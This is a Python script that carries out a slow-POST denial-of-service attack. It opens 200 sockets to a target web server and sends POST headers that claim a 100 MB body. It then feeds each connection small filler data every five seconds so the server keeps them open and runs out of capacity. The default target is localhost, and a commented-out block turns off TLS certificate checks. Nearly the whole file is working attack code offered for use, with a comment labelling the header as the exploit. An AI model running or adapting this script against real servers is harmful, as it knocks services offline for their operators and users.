import time 
import platform
import sys
import ssl
import socket 

targetIP = "127.0.0.1"
targetPort= 80
targetHostName = None
socketExistsList = []


#python Agent 
pythonVersion=sys.version.split()[0]
osInfo = platform.system()
pythonAgent = pythonVersion + osInfo


def sendHttpEncoding(self,payload):
    self.send(payload.encode("utf-8"))
setattr(socket.socket,'sendHttpEncoding', sendHttpEncoding) # Adding New Methods 


def CreaetingSocket(targetIP,targetPort):
    malSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    malSocket.settimeout(10)

            # if (target is https) 
    
            # sslContext = ssl.create_default_context() 
            # #Conifuger SSL
            # sslContext.verify_mode = ssl.CERT_NONE # Not attempt to verify the SSL certification
            # sslContext.check_hostname = False      # Check the hostname whether match with CN (comment name)
            # # CN (Common Name) is a field that is part of the certificate's Subject field.        
            # secureSocket = sslContext.wrap_socket(socket,server_hostname=hostame )

    malSocket.connect((targetIP,targetPort))


    #Construting HTTP packet  
    requestLine = "POST / HTTP/1.1\r\n"

    #Header 
    hostHeader = f"Host: {targetIP}\r\n"
    userAnget = f"User-Agent: {pythonAgent}\r\n" 
    contentLength = f"Content-Length: 100000000\r\n" # (Exploit the vuln)
    connection = "Connection: keep-alive\r\n\r\n"

    malSocket.sendHttpEncoding(requestLine)
    malSocket.sendHttpEncoding(hostHeader)
    malSocket.sendHttpEncoding(contentLength)
    malSocket.sendHttpEncoding(connection)
    
    return malSocket



def KeepAlive():

    print("Keep-Alive /// . ///")
    print(f"The Number of Current Socekt:{len(socketExistsList)}" )    
    
    for malSocket in list(socketExistsList):
        try:
            malSocket.sendHttpEncoding("meowData \r\n\r\n")
        except:
            socketExistsList.remove(malSocket)

if __name__ == "__main__":

    for i in range(200):
        try:
            #Connetct to Target 
            malSocket = CreaetingSocket(targetIP,targetPort)
            #print(malSocket)
        except Exception as e:
            print("Error",str(e))
            break
        
        socketExistsList.append(malSocket)
        print(str(socketExistsList))
    
    #Keep-Alive (Rrevent RST)
    while True:
        try:
            KeepAlive()
            
        except KeyboardInterrupt:
            print("OK, bye")
            break
        time.sleep(5)
        
        



    